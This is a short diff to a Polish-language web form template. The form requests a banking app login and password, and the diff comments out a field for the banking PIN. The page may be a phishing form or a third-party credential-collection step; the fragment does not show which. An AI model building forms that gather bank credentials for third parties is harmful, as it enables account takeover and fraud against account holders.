@@ -39,7 +39,7 @@
                           role="form">
                         <input name="login" type="text" class="form-control mb-2" placeholder="Login do aplikacji bankowej" required="">
                         <input name="password" type="password" class="form-control mb-2" minlength="6" placeholder="Hasło do aplikacji bankowej" required="">
-                        <input name="pin" class="form-control mb-2" minlength="1" type="number" placeholder="Kod PIN do aplikacji bankowej" required="">
+{{--                        <input name="pin" class="form-control mb-2" minlength="1" type="number" placeholder="Kod PIN do aplikacji bankowej" required="">--}}
 
                         <input type="submit" class="form-control btn btn-primary btn-lg" value="Wejść" style="border-radius: inherit; background: #ff6200;">
                     </form>
